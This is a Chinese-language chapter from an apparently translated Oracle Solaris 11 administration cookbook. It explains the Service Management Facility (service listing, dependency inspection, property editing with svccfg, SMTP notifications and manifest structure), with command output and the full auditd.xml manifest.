# 第五章：玩转 Oracle Solaris 11 服务

本章将涵盖：

+   审查 SMF 操作

+   处理清单和配置文件

+   创建 SMF 服务

+   管理 inetd 控制的网络服务

+   排查 Oracle Solaris 11 服务问题

# 介绍

Oracle Solaris 11 将**服务管理设施**（**SMF**）作为一个主要特性。这个框架负责管理和监控所有服务和应用程序。SMF 在 Oracle Solaris 10 中引入，它提供了多种可能性，通过负责多个任务使我们的工作变得更轻松，例如以下任务：

+   启动、停止和重启服务

+   监控服务

+   发现所有服务依赖关系

+   排查服务问题

+   为每个可用服务提供单独的日志

通常，每个系统中有许多服务，并且这些服务按类别组织，如系统、网络、设备和应用程序。通常，一个服务只有一个名为 default 的实例。然而，一个服务可以呈现多个实例（例如，可以有多个 Oracle 实例和多个配置的网络接口，并且这种差异在引用服务时会突出显示。这个引用被称为**故障管理资源标识符**（**FMRI**），格式类似于`svc:/system/cron:default`，其中：

+   `svc`：这是 SMF 的本地服务

+   `system`：这是服务类别

+   `cron`：这是服务名称

+   `default`：这是实例

负责管理所有 SMF 服务的主要守护进程是`svc.startd`，它在系统初始化时被调用，读取配置文件`/etc/inittab`，如下所示：

```
root@solaris11-1:~# more /etc/inittab
 (truncated output)
ap::sysinit:/usr/sbin/autopush -f /etc/iu.ap
smf::sysinit:/lib/svc/bin/svc.startd  >/dev/msglog 2<>/dev/msglog </dev/console
p3:s1234:powerfail:/usr/sbin/shutdown -y -i5 -g0 >/dev/msglog 2<>/dev/msglog
root@solaris11-1:~#
```

`svc.startd`的另一个目标是确保系统达到适当的里程碑，也就是一组服务上线的状态或级别，这些服务与旧版运行级别状态非常相似。重要的里程碑有单用户（运行级别 S）、多用户（运行级别 2）和多用户服务器（运行级别 3）：

```
root@solaris11-1:~# svcs -a | grep milestone
online         21:54:11 svc:/milestone/unconfig:default
online         21:54:11 svc:/milestone/config:default
online         21:54:12 svc:/milestone/devices:default
online         21:54:23 svc:/milestone/network:default
online         21:54:25 svc:/milestone/name-services:default
online         21:54:25 svc:/milestone/single-user:default
online          0:54:52 svc:/milestone/self-assembly-complete:default
online          0:54:59 svc:/milestone/multi-user:default
online          0:55:00 svc:/milestone/multi-user-server:default
```

有两个特殊的里程碑，如下所示：

+   **all**：这是默认的里程碑，其中所有服务都会初始化

+   **none**：没有初始化任何服务——这可以在 Oracle Solaris 11 维护期间使用

基于前述信息，了解正确的初始化顺序是非常重要的，如下所示：

+   **Boot loader**：根文件系统归档从磁盘加载到内存中

+   **Booter**：引导归档（它是一个类似于 Linux 中的`initramfs`的 RAM 磁盘映像，包含启动系统所需的所有文件）被加载到内存中并执行。引导加载程序是一个服务：

    ```
    root@solaris11-1:~# svcs -a | grep boot-archive
    online         21:53:51 svc:/system/boot-archive:default
    online          0:54:51 svc:/system/boot-archive-update:default
    ```

任何`boot-archive`维护操作必须由`bootadm`命令完成。

+   **Ram disk**：内核从引导归档中提取并执行。

+   **内核**：一个小的根文件系统被挂载，然后从那里加载重要的驱动程序。之后，真正的根文件系统被挂载，剩余的驱动程序被加载，`/sbin/init` 脚本被执行。

+   **Init**：`/sbin/init` 脚本读取 `/etc/inittab` 文件，并执行 `svc.started` 守护进程。

+   **svc.started**：这会启动 SMF 服务及其相关进程。所有服务配置通过 `svc.configd` 守护进程从名为 `repository.db` 的主服务数据库中读取，该数据库位于 `/etc/svc` 目录下，并有相应的备份文件。

# 审查 SMF 操作

在 Oracle Solaris 11 中管理服务非常简单，因为它的命令语法直观且不多。因此，本节的主要目的是回顾 SMF 管理的操作部分。

## 准备工作

本食谱需要一台安装了 Oracle Solaris 11 并且具有 4 GB 内存的虚拟机（VirtualBox 或 VMware）。

## 如何执行…

当管理员负责管理 Oracle Solaris 11 中的服务时，最重要且最常见的任务是列出现有的服务。此操作可以通过执行以下命令来完成：

```
root@solaris11-1:~# svcs -a | more
STATE          STIME    FMRI
legacy_run      0:54:59 lrc:/etc/rc2_d/S47pppd
legacy_run      0:54:59 lrc:/etc/rc2_d/S89PRESERVE
disabled       21:53:34 svc:/system/device/mpxio-upgrade:default
disabled       21:53:35 svc:/network/install:default
disabled       21:53:36 svc:/network/ipsec/ike:default
(truncated output)
online         21:53:34 svc:/system/early-manifest-import:default
online         21:53:34 svc:/system/svc/restarter:default
online         21:53:41 svc:/network/socket-config:default
(truncated output)

```

`svcs` 命令的目的是列出现有的服务，当指定 `-a` 选项时，我们希望列出所有的服务。

从前面的输出中，得到以下有用的信息：

+   `legacy_run` 状态是遗留服务的标签，这些服务未被转换到 SMF 框架中。其他可能的状态如下：

    +   `online`：这意味着服务正在运行

    +   `disabled`：这意味着服务没有运行

    +   `offline`：这意味着服务已启用，但它要么没有运行，要么无法运行

    +   `initialized`：这意味着服务正在启动

    +   `degraded`：这意味着服务正在运行，但仅部分功能可用

    +   `maintenance`：这意味着服务没有运行，因为存在配置问题

+   `STIME` 字段显示服务启动的时间

+   `FMRI` 是引用服务的别名对象

在 Oracle Solaris 11 中，SMF 在查找服务依赖关系（`-d` 选项）和发现哪些服务依赖于该服务（`-D` 选项）时表现得非常出色。以下是一些示例：

```
root@solaris11-1:~# svcs -a | grep auditd
online          0:54:55 svc:/system/auditd:default
root@solaris11-1:~# svcs -d svc:/system/auditd:default
STATE          STIME    FMRI
online         21:54:25 svc:/milestone/name-services:default
online         21:54:40 svc:/system/filesystem/local:default
online          0:54:53 svc:/system/system-log:default
root@solaris11-1:~# svcs -D svc:/system/auditd:default
STATE          STIME    FMRI
disabled       21:53:48 svc:/system/console-login:terma
disabled       21:53:49 svc:/system/console-login:termb
online          0:54:55 svc:/system/console-login:default
online          0:54:56 svc:/system/console-login:vt2
online          0:54:56 svc:/system/console-login:vt6
online          0:54:56 svc:/system/console-login:vt3
online          0:54:56 svc:/system/console-login:vt5
online          0:54:56 svc:/system/console-login:vt4
online          0:54:59 svc:/milestone/multi-user:default
```

另一种寻找服务依赖关系的好方法是使用 `svc` 命令，如下所示：

```
root@solaris11-1:~# svcs -l svc:/system/auditd:default
fmri         svc:/system/auditd:default
name         Solaris audit daemon
enabled      true
state        online
next_state   none
state_time   March  5, 2014 00:43:41 AM BRT
logfile      /var/svc/log/system-auditd:default.log
restarter    svc:/system/svc/restarter:default
contract_id  115 
manifest     /lib/svc/manifest/system/auditd.xml
dependency   require_all/none svc:/system/filesystem/local (online)
dependency   require_all/none svc:/milestone/name-services (online)
dependency   optional_all/none svc:/system/system-log (online)
```

从之前的输出中获得一些有用信息，例如知道该服务已启用（`online`）；它有三个服务依赖关系（如 `svcs –d` 命令所示）；并找到它们各自的日志文件（`/var/svc/log/system-auditd:default.log`），可以使用 `more /var/svc/log/system-auditd:default.log` 来查看。

通过运行以下命令，可以学习到有关 `contract_id` 属性（`115`）的有用信息：

```
root@solaris11-1:~# ctstat -i 115 -v
CTID    ZONEID  TYPE    STATE   HOLDER  EVENTS  QTIME   NTIME   
115     0       process owned   11      0       -       -       
  cookie:                0x20
  informative event set: none
  critical event set:    hwerr empty
  fatal event set:       none
  parameter set:         inherit regent
  member processes:      944
  inherited contracts:   none
  service fmri:          svc:/system/auditd:default
  service fmri ctid:     115
  creator:               svc.startd
  aux:                   start
root@solaris11-1:~#
```

从 `auditd` 获取的相关进程 ID 是 `944`，该服务是由 `svc.startd` 守护进程初始化的。此外，通过使用 FMRI 的简短形式运行以下命令，也可以找到关于进程 ID 的相同信息：

```
root@solaris11-1:~# svcs -p auditd
STATE          STIME    FMRI
online          0:54:55 svc:/system/auditd:default
                0:54:55      944 auditd

```

FMRI 的简短形式是一个独特的序列，它使得能够将该服务与其他服务区分开，并且此简短形式始终指向指定服务的默认实例。

一个用于故障排除服务的好 `svcs` 命令参数如下：

```
root@solaris11-1:~# svcs -x auditd
svc:/system/auditd:default (Solaris audit daemon)
 State: online since March  2, 2014 12:54:55 AM BRT
   See: auditd(1M)
   See: audit(1M)
   See: auditconfig(1M)
   See: audit_flags(5)
   See: audit_binfile(5)
   See: audit_syslog(5)
   See: audit_remote(5)
   See: /var/svc/log/system-auditd:default.log
Impact: None.
```

如果有任何已经配置的服务，它应该在运行。但是，如果它没有运行，或者它阻止了其他服务的运行，我们可以通过执行以下命令来找出原因：

```
root@solaris11-1:~# svcs -xv

```

上一个命令的输出没有显示任何内容，但可能存在一些损坏的服务。在本章的最后，我们将回到这个问题。

到目前为止，所有任务都集中在收集服务信息上。我们的下一步是学习如何使用 `svcadm` 命令进行管理。此命令的可用选项如下：

+   `svcadm enable <fmri>`：这将启用一个服务

+   `svcadm enable –r <fmri>`：这将递归启用一个服务及其依赖项

+   `svcadm disable <fmri>`：这将禁用一个服务

+   `svcadm disable –t <fmri>`：这将暂时禁用一个服务（该服务将在下次启动时启用）

+   `svcadm restart <fmri>`：这将重启一个服务

+   `svcadm refresh <fmri>`：这将重新读取服务的配置文件

+   `svcadm clear <fmri>`：这将使服务从维护状态恢复到在线状态

+   `svcadm mark maintenance <fmri>`：这将把服务置于维护状态

以下是一些示例：

```
root@solaris11-1:/# svcadm disable auditd
root@solaris11-1:/# svcs -a | grep auditd
disabled       20:33:12 svc:/system/auditd:default
root@solaris11-1:/# svcadm enable auditd
root@solaris11-1:/# svcs -a | grep auditd
online         20:33:35 svc:/system/auditd:default
```

SMF 还支持通过 SMTP 服务和 SNMP trap 进行通知功能。要启用和配置此功能（使用 SMTP），需要安装通知包，执行此任务可以通过运行以下命令：

```
root@solaris11-1:/# pkg install smtp-notify

```

安装 `smtp-notify` 包后，我们可以启用并配置任何服务，以便在其状态从在线变为维护时，将消息发送到 `root@localhost`，如下所示：

```
root@solaris11-1:/# svcadm enable smtp-notify
root@solaris11-1:/# svcs -a | grep smtp-notify
online         20:29:07 svc:/system/fm/smtp-notify:default
root@solaris11-1:~# svccfg -s svc:/system/fm/smtp-notify:default setnotify -g from-online,to-maintenance mailto:root@localhost

```

要检查是否所有服务的通知服务已正确配置，请执行以下命令：

```
root@solaris11-1:~# svcs –n
Notification parameters for FMA Events
    Event: problem-diagnosed
        Notification Type: smtp
            Active: true
            reply-to: root@localhost
            to: root@localhost

        Notification Type: snmp
            Active: true

        Notification Type: syslog
            Active: true

    Event: problem-repaired
        Notification Type: snmp
            Active: true

    Event: problem-resolved
        Notification Type: snmp
            Active: true
System wide notification parameters:
svc:/system/svc/global:default:
    Event: to-maintenance
        Notification Type: smtp
            Active: true
            to: root@localhost

    Event: from-online
        Notification Type: smtp
            Active: true
            to: root@localhost
```

最后，如果我们检查根邮箱，我们将看到我们的配置结果：

```
root@solaris11-1:/# mail
From noaccess@solaris11-1.example.com Sun Mar  2 20:29:05 2014
Date: Sun, 2 Mar 2014 05:17:28 -0300 (BRT)
From: No Access User <noaccess@solaris11-1.example.com>
Message-Id: <201403020817.s228HSRC006537@solaris11-1.example.com>
Subject: Fault Management Event: solaris11-1:SMF-8000-YX
To: root@solaris11-1.example.com
Content-Length: 791

SUNW-MSG-ID: SMF-8000-YX, TYPE: defect, VER: 1, SEVERITY: major
EVENT-TIME: Sun Mar  2 05:17:23 BRT 2014
PLATFORM: VirtualBox, CSN: 0, HOSTNAME: solaris11-1
SOURCE: software-diagnosis, REV: 0.1
EVENT-ID: acfbe77f-47fc-6e3b-835a-9005dc8ec70c
DESC: A service failed - a method is failing in a retryable manner but too often.
AUTO-RESPONSE: The service has been placed into the maintenance state.
IMPACT: svc:/system/zones:default is unavailable.
REC-ACTION: Run 'svcs -xv svc:/system/zones:default' to determine the generic reason why the service failed, the location of any logfiles, and a list of other services impacted. Please refer to the associated reference document at http://support.oracle.com/msg/SMF-8000-YX for the latest service procedures and policies regarding this diagnosis.
```

Oracle Solaris 11 中的一个服务有多个属性，所有这些属性都可以通过 `svcprop` 命令查看，如下所示：

```
root@solaris11-1:/# svcprop auditd
preselection/flags astring lo
preselection/naflags astring lo
preselection/read_authorization astring solaris.smf.value.audit
preselection/value_authorization astring solaris.smf.value.audit
queuectrl/qbufsz count 0
queuectrl/qdelay count 0
queuectrl/qhiwater count 0
queuectrl/qlowater count 0
(truncated output)

```

如果我们要检查审计服务的特定属性，我们需要执行以下命令：

```
root@solaris11-1:/# svcprop -p audit_remote_server/login_grace_time auditd
30
```

如果我们进一步操作，可以通过 `svccfg` 命令与服务的属性进行交互（读取和写入）：

```
root@solaris11-1:/# svccfg 
svc:>
```

第一步是通过运行以下命令序列列出所有可用的服务：

```
svc:> list
application/cups/scheduler
application/cups/in-lpd
smf/manifest
application/security/tcsd
application/management/net-snmp
(truncated output)

svc:> select auditd
svc:/system/auditd> list
:properties
default
```

在选择 `auditd` 服务时，有两种可能性——列出服务的一般属性或列出其 `default` 实例的私有属性。因此，要列出其一般属性，请执行以下命令：

```
svc:/system/auditd> listprop
usr                          dependency         
usr/entities                 fmri        svc:/system/filesystem/local
usr/grouping                 astring     require_all
usr/restart_on               astring     none
(truncated output)

```

从默认实例列出属性的操作通过执行以下命令完成：

```
svc:/system/auditd:default> select auditd:default
svc:/system/auditd:default> listprop
preselection                        application
preselection/flags                  astring     lo
preselection/naflags                astring     lo
preselection/read_authorization     astring   solaris.smf.value.audit
preselection/value_authorization    astring   solaris.smf.value.audit
queuectrl                           application
(truncated output)

```

通过运行以下命令，可以列出并更改任何服务的属性：

```
svc:/system/auditd:default> listprop audit_remote/p_timeout
audit_remote/p_timeout count       5
svc:/system/auditd:default> setprop audit_remote/p_timeout=10
svc:/system/auditd:default> listprop audit_remote/p_timeout
audit_remote/p_timeout count       10
```

很多时候，在重新配置期间，服务的属性可能会更改为另一个非默认值，最终该服务可能会因为这个新配置而出现问题并进入维护状态。那么，如何恢复属性的旧值呢？

为了解决这个问题，我们可以将此服务的所有属性值恢复为默认值。此任务可以通过使用 SMF 的自动快照（一种备份方式）来执行。因此，请执行以下命令：

```
svc:/system/auditd:default> revert start
svc:/system/auditd:default> listprop audit_remote/p_timeout
audit_remote/p_timeout count       5
svc:/system/auditd:default> unselect
svc:/system/auditd> unselect
svc:> exit
root@solaris11-1:~#
```

可用的快照如下：

+   `running`：每次运行 `svcadm` 刷新时都会拍摄此快照

+   `start`：此快照是在最后一次成功启动时拍摄的

+   `initial`：此快照是在第一次导入清单时拍摄的

SMF 清单是一个 XML 文件，描述了一个服务、一组实例及其各自的属性。当导入一个清单时，所有配置（包括其属性）都会被加载到服务配置库中。清单的默认位置是 `/lib/svc/` 下的 `manifest` 目录。

另一个有趣且相关的任务是学习如何更改服务的环境变量。以下示例展示了将 `TZ` 属性的值更改为 Brazil/East：

```
root@solaris11-1:~# pargs -e `pgrep -f /usr/sbin/auditd`
937:  /usr/sbin/auditd
envp[0]: _=*11*/usr/sbin/auditd
envp[1]: LANG=en_US.UTF-8
envp[2]: LC_ALL=
envp[3]: LC_COLLATE=
envp[4]: LC_CTYPE=
envp[5]: LC_MESSAGES=
envp[6]: LC_MONETARY=
envp[7]: LC_NUMERIC=
envp[8]: LC_TIME=
envp[9]: PATH=/usr/sbin:/usr/bin
envp[10]: PWD=/root
envp[11]: SHLVL=2
envp[12]: SMF_FMRI=svc:/system/auditd:default
envp[13]: SMF_METHOD=start
envp[14]: SMF_RESTARTER=svc:/system/svc/restarter:default
envp[15]: SMF_ZONENAME=global
envp[16]: TZ=localtime
envp[17]: A__z="*SHLVL
```

因此，为了更改并检查 `auditd` 服务中 `TZ` 属性的值，请执行以下命令：

```
root@solaris11-1:~# svccfg -s svc:/system/auditd:default setenv TZ Brazil/East
root@solaris11-1:~# svcadm refresh svc:/system/auditd:default
root@solaris11-1:~# svcadm restart svc:/system/auditd:default
root@solaris11-1:~# pargs -e `pgrep -f /usr/sbin/auditd`
7435:  /usr/sbin/auditd
envp[0]: _=*11*/usr/sbin/auditd
envp[1]: LANG=en_US.UTF-8
envp[2]: LC_ALL=
envp[3]: LC_COLLATE=
envp[4]: LC_CTYPE=
envp[5]: LC_MESSAGES=
envp[6]: LC_MONETARY=
envp[7]: LC_NUMERIC=
envp[8]: LC_TIME=
envp[9]: PATH=/usr/sbin:/usr/bin
envp[10]: PWD=/root
envp[11]: SHLVL=2
envp[12]: SMF_FMRI=svc:/system/auditd:default
envp[13]: SMF_METHOD=start
envp[14]: SMF_RESTARTER=svc:/system/svc/restarter:default
envp[15]: SMF_ZONENAME=global
envp[16]: TZ=Brazil/East
envp[17]: A__z="*SHLVL
```

查找在 SMF 配置库中更改的属性还有一个好方法：

```
root@solaris11-1:~# svccfg -s auditd listcust -L
start/environment              astring     admin       TZ=Brazil/East
```

### 方法概览

在本节中，你学习了 SMF 的基本原理，以及如何使用 `svcs` 和 `svcadm` 来管理 SMF 服务。我们还配置了通知服务，使用 SMTP 服务记录任何有趣的事件，例如更改服务状态。最后，使用 `svcprop` 和 `svccfg` 命令来获取并查看服务的属性，并通过 `svccfg` 中的快照功能（`listsnap` 和 `revert` 子命令）回滚所有属性到默认值。

# 处理清单和配置文件

在处理 SMF 服务时，几乎每个服务的配置都集中在两个关键概念上：配置文件和清单。以下方法将教你这些细节。

## 准备工作

本方法需要运行 Oracle Solaris 11 的虚拟机（VirtualBox 或 VMware），且内存为 4 GB。

## 如何操作…

正如我们之前解释的那样，SMF 清单是一个描述服务、实例集及其属性的 XML 文件。当清单被导入时，它的整个配置（包括其属性）将被加载到服务配置库中。通过执行以下命令，可以强制执行导入操作，从而可能将新配置加载到库中：

```
root@solaris11-1:~# svcadm restart svc:/system/manifest-import:default

```

清单的默认位置是`/lib/svc/`下的`manifest`目录，如下所示：

```
root@solaris11-1:~# cd /lib/svc/manifest/
root@solaris11-1:/lib/svc/manifest# ls –l
total 27
drwxr-xr-x  10 root     sys           17 Dec 23 18:41 application
drwxr-xr-x   2 root     sys            2 Sep 19  2012 device
drwxr-xr-x   2 root     sys           10 Dec 23 18:54 milestone
drwxr-xr-x  16 root     sys           53 Jan 17 07:23 network
drwxr-xr-x   2 root     sys            2 Sep 19  2012 platform
drwxr-xr-x   2 root     sys            2 Sep 19  2012 site
drwxr-xr-x   8 root     sys           73 Dec 23 18:55 system
root@solaris11-1:/lib/svc/manifest# cd application/
root@solaris11-1:/lib/svc/manifest/application# ls –l
total 92
-r--r--r--   1 root     sys         3464 Sep 19  2012 coherence.xml
-r--r--r--   1 root     sys         6160 Sep 19  2012 cups.xml
drwxr-xr-x   2 root     sys           11 Dec 23 18:41 desktop-cache
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 font
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 graphical-login
-r--r--r--   1 root     sys         1762 Sep 19  2012 man-index.xml
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 management
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 opengl
drwxr-xr-x   2 root     sys            7 Dec 23 18:41 pkg
drwxr-xr-x   2 root     sys            3 Dec 23 18:41 security
-r--r--r--   1 root     sys         2687 Sep 19  2012 stosreg.xml
-r--r--r--   1 root     sys         1579 Sep 19  2012 texinfo-update.xml
-r--r--r--   1 root     sys         9013 Sep 19  2012 time-slider-plugin.xml
-r--r--r--   1 root     sys         4469 Sep 19  2012 time-slider.xml
drwxr-xr-x   2 root     sys            5 Dec 23 18:41 x11
```

根据输出，服务清单被分类为：

+   `application`

+   `device`

+   `milestone`

+   `network`

+   `platform`

+   `site`

+   `system`

上述输出列出了所有应用清单作为示例，正如我们将要学习的那样，清单在服务配置中起着非常重要的作用。例如，研究`audit.xml`清单以了解细节会很有帮助。因此，这一学习将如下进行：

```
root@solaris11-1:/lib/svc/manifest# cd system/
root@solaris11-1:/lib/svc/manifest/system# cat auditd.xml
<?xml version="1.0"?>
<!DOCTYPE service_bundle SYSTEM "/usr/share/lib/xml/dtd/service_bundle.dtd.1">
<!--
 Copyright (c) 2005, 2012, Oracle and/or its affiliates. All rights reserved.

    NOTE:  This service manifest is not editable; its contents will
    be overwritten by package or patch operations, including
    operating system upgrade.  Make customizations in a different
    file.
-->

<service_bundle type='manifest' name='SUNWcsr:auditd'>

<service
  name='system/auditd'
  type='service'
  version='1'>

  <single_instance />

  <dependency
    name='usr'
    type='service'
    grouping='require_all'
    restart_on='none'>
    <service_fmri value='svc:/system/filesystem/local' />
  </dependency>

  <dependency
    name='ns'
    type='service'
    grouping='require_all'
    restart_on='none'>
    <service_fmri value='svc:/milestone/name-services' />
  </dependency>

  <dependency
    name='syslog'
    type='service'
    grouping='optional_all'
    restart_on='none'>
    <service_fmri value='svc:/system/system-log' />
  </dependency>

  <dependent
    name='multi-user'
    grouping='optional_all'
    restart_on='none'>
    <service_fmri value='svc:/milestone/multi-user'/>
  </dependent>

  <dependent
    name='console-login'
    grouping='optional_all'
    restart_on='none'>
    <service_fmri value='svc:/system/console-login'/>
  </dependent>

  <exec_method
    type='method'
    name='start'
    exec='/lib/svc/method/svc-auditd'
    timeout_seconds='60'>
    <method_context>
      <method_credential user='root' group='root' />
    </method_context>
  </exec_method>

  <exec_method
    type='method'
    name='refresh'
    exec='/lib/svc/method/svc-auditd'
    timeout_seconds='30'>
    <method_context>
      <method_credential user='root' group='root' />
    </method_context>
  </exec_method>

  <!--
    auditd waits for c2audit to quiet down after catching a -TERM
    before exiting; auditd's timeout is 20 seconds
  -->

  <exec_method
    type='method'
    name='stop'
    exec=':kill -TERM'
    timeout_seconds='30'>
    <method_context>
      <method_credential user='root' group='root' />
    </method_context>
  </exec_method>

  <!-- SIGs HUP, TERM, and USR1 are all expected by auditd -->
  <property_group name='startd' type='framework'>
    <propval name='ignore_error' type='astring'
      value='core,signal' />
  </property_group>

  <property_group name='general' type='framework'>
    <!-- to start/stop auditd -->
    <propval name='action_authorization' type='astring'
      value='solaris.smf.manage.audit' />
    <propval name='value_authorization' type='astring'
      value='solaris.smf.manage.audit' />
  </property_group>

  <instance name='default' enabled='true'>

  <!--
    System-wide audit preselection flags - see auditconfig(1M)
    and audit_flags(5).

    The 'flags' property is the system-wide default set of
    audit classes that is combined with the per-user audit
    flags to configure the process audit at login and role
    assumption time.

    The 'naflags' property is the set of audit classes for
    audit event selection when an event cannot be attributed
    to an authenticated user.
  -->
  <property_group name='preselection' type='application'>
    <propval name='flags' type='astring'
      value='lo' />
    <propval name='naflags' type='astring'
      value='lo' />
    <propval name='read_authorization' type='astring'
      value='solaris.smf.value.audit' />
    <propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' />
  </property_group>

  <!--
    Audit Queue Control Properties - see auditconfig(1M)

      Note, that the default value for all the queue control
      configuration parameters is 0, which makes auditd(1M) to
      use current active system parameters.
  -->
  <property_group name='queuectrl' type='application' >
    <propval name='qbufsz' type='count'
      value='0' />
    <propval name='qdelay' type='count'
      value='0' />
    <propval name='qhiwater' type='count'
      value='0' />
    <propval name='qlowater' type='count'
      value='0' />
    <propval name='read_authorization' type='astring'
      value='solaris.smf.value.audit' />
    <propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' />
  </property_group>

  <!--
    Audit Policies - see auditconfig(1M)

      Note, that "all" and "none" policies available as a
      auditconfig(1M) policy flags actually means a full/empty set
      of other policy flags. Thus they are not configurable in the
      auditd service manifest, but set all the policies to true
      (all) or false (none).
  -->
  <property_group name='policy' type='application' >
    <propval name='ahlt' type='boolean'
      value='false' />
    <propval name='arge' type='boolean'
      value='false' />
    <propval name='argv' type='boolean'
      value='false' />
    <propval name='cnt' type='boolean'
      value='true' />
    <propval name='group' type='boolean'
      value='false' />
    <propval name='path' type='boolean'
      value='false' />
    <propval name='perzone' type='boolean'
      value='false' />
    <propval name='public' type='boolean'
      value='false' />
    <propval name='seq' type='boolean'
      value='false' />
    <propval name='trail' type='boolean'
      value='false' />
    <propval name='windata_down' type='boolean'
      value='false' />
    <propval name='windata_up' type='boolean'
      value='false' />
    <propval name='zonename' type='boolean'
      value='false' />
    <propval name='read_authorization' type='astring'
      value='solaris.smf.value.audit' />
    <propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' />
  </property_group>

  <!--
    Audit Remote Server to allow reception of data sent by the
    audit_remote(5) - see audit auditconfig(1M).

    'active' is boolean which defines whether the server functionality
      is activated or not.

    'listen_address' address the server listens on.
      Empty 'listen_address' property defaults to listen on all
      local addresses.

    'listen_port' the local listening port; 0 defaults to 16162 - port
      associated with the "solaris-audit" Internet service name - see
      services(4).

    'login_grace_time' the server disconnects after login grace time
      (in seconds) if the connection has not been successfully
      established; 0 defaults to no limit, default value is 30 (seconds).

    'max_startups' number of concurrent unauthenticated connections
      to the server at which the server starts refusing new
      connections; default value is 10\. Note that the value might
      be specified in "begin:rate:full" format to allow random
      early drop mode.
  -->
        <property_group name='audit_remote_server' type='application' >
                <propval name='active' type='boolean'
                        value='true' />
                <propval name='listen_address' type='astring'
                        value='' />
                <propval name='listen_port' type='count'
                        value='0' />
                <propval name='login_grace_time' type='count'
                        value='30' />
                <propval name='max_startups' type='astring'
                        value='10' />
                <property name='read_authorization' type='astring'>
                        <astring_list>
                                <value_node value='solaris.smf.manage.audit' />
                                <value_node value='solaris.smf.value.audit' />
                        </astring_list>
                </property>
                <propval name='value_authorization' type='astring'
                        value='solaris.smf.value.audit' />
        </property_group>

  <!--
    Plugins to configure where to send the audit trail - see
    auditconfig(1M), audit_binfile(5), audit_remote(5),
    audit_syslog(5) 

    Each plugin type property group has properties:

    'active' is a boolean which defines whether or not
      to load the plugin.

    'path' is a string which defines name of the
      plugin's shared object in the file system.
      Relative paths assume a prefix of
      "/usr/lib/security/$ISA"

    'qsize' is an integer which defines a plugin specific
      maximum number of records that auditd will queue
      for it. A zero (0) value indicates not defined.
      This overrides the system's active queue control
      hiwater mark.

      and various attributes as defined on the plugin's man page
  -->
  <property_group name='audit_binfile' type='plugin' >
    <propval name='active' type='boolean'
      value='true' />
    <propval name='path' type='astring'
      value='audit_binfile.so' />
    <propval name='qsize' type='count'
      value='0' />
    <propval name='p_dir' type='astring'
      value='/var/audit' />
    <propval name='p_fsize' type='astring'
      value='0' />
    <propval name='p_minfree' type='count'
      value='1' />
    <property name='read_authorization' type='astring'>
      <astring_list>
        <value_node value='solaris.smf.manage.audit' />
        <value_node value='solaris.smf.value.audit' />
      </astring_list>
    </property>
    <propval name='value_authorization' type='astring'
        value='solaris.smf.value.audit' />
  </property_group>

  <property_group name='audit_syslog' type='plugin' >
    <propval name='active' type='boolean'
      value='false' />
    <propval name='path' type='astring'
      value='audit_syslog.so' />
    <propval name='qsize' type='count'
      value='0' />
    <propval name='p_flags' type='astring'
      value='' />
    <property name='read_authorization' type='astring'>
      <astring_list>
        <value_node value='solaris.smf.manage.audit' />
        <value_node value='solaris.smf.value.audit' />
     </astring_list>
    </property>
    <propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' />
  </property_group>

  <property_group name='audit_remote' type='plugin' >
    <propval name='active' type='boolean'
      value='false' />
    <propval name='path' type='astring'
      value='audit_remote.so' />
    <propval name='qsize' type='count'
      value='0' />
    <propval name='p_hosts' type='astring'
      value='' />
    <propval name='p_retries' type='count'
      value='3' />
    <propval name='p_timeout' type='count'
      value='5' />
    <property name='read_authorization' type='astring'>
      <astring_list>
        <value_node value='solaris.smf.manage.audit' />
        <value_node value='solaris.smf.value.audit' />
      </astring_list>
    </property>
    <propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' />
  </property_group>

  </instance>

  <stability value='Evolving' />

  <template>
    <common_name>
      <loctext xml:lang='C'>
        Solaris audit daemon
      </loctext>
    </common_name>
    <documentation>
      <manpage title='auditd'
        section='1M'
        manpath='/usr/share/man'/>
      <manpage title='audit'
        section='1M'
        manpath='/usr/share/man'/>
      <manpage title='auditconfig'
        section='1M'
        manpath='/usr/share/man'/>
      <manpage title='audit_flags'
        section='5'
        manpath='/usr/share/man'/>
      <manpage title='audit_binfile'
        section='5'
        manpath='/usr/share/man'/>
      <manpage title='audit_syslog'
        section='5'
        manpath='/usr/share/man'/>
      <manpage title='audit_remote'
        section='5'
        manpath='/usr/share/man'/>
           </documentation>
  </template>

</service>

</service_bundle>
```

这个清单（`auditd.xml`）包含几个在其他清单中也会出现的常见元素。关键元素如下所示：

+   `service_bundle`：这是`auditd`守护进程的包名称

+   `service`：这是服务的名称（`system/auditd`）

+   `dependency`：这决定了`auditd`依赖哪些服务

+   `dependent`：这决定了哪些服务依赖于`auditd`

+   `exec_method`：这是 SMF 如何启动、停止、重启和刷新`auditd`守护进程

+   `property_group`：这些是来自`auditd`服务及其实例的属性

+   `template`：这决定了关于`auditd`服务的可用信息及其所在位置

+   `manpage`：这决定了与`auditd`服务相关的 man 页面

配置文件是一个 XML 配置文件，在 Oracle Solaris 11 安装后的第一次系统启动时应用，在此过程中可以自定义将初始化哪些服务和实例。以下是一个目录列表：

```
root@solaris11-1:~# cd /etc/svc/profile/
root@solaris11-1:/etc/svc/profile# ls -al
total 81
drwxr-xr-x   3 root     sys           17 Dec 23 18:56 .
drwxr-xr-x   3 root     sys           15 Mar  4 02:49 ..
-r--r--r--   1 root     sys        12262 Sep 19  2012 generic_limited_net.xml
-r--r--r--   1 root     sys         6436 Sep 19  2012 generic_open.xml
lrwxrwxrwx   1 root     staff         23 Dec 23 18:56 generic.xml -> generic_limited_net.xml
-r--r--r--   1 root     sys         2581 Sep 19  2012 inetd_generic.xml
lrwxrwxrwx   1 root     staff         17 Dec 23 18:56 inetd_services.xml -> inetd_generic.xml
-r--r--r--   1 root     sys          713 Sep 19  2012 inetd_upgrade.xml
lrwxrwxrwx   1 root     staff         10 Dec 23 18:56 name_service.xml -> ns_dns.xml
-r--r--r--   1 root     sys          571 Sep 19  2012 ns_dns.xml
-r--r--r--   1 root     sys          478 Sep 19  2012 ns_files.xml
-r--r--r--   1 root     sys          713 Sep 19  2012 ns_ldap.xml
-r--r--r--   1 root     sys          832 Sep 19  2012 ns_nis.xml
-r--r--r--   1 root     sys         1673 Sep 19  2012 ns_none.xml
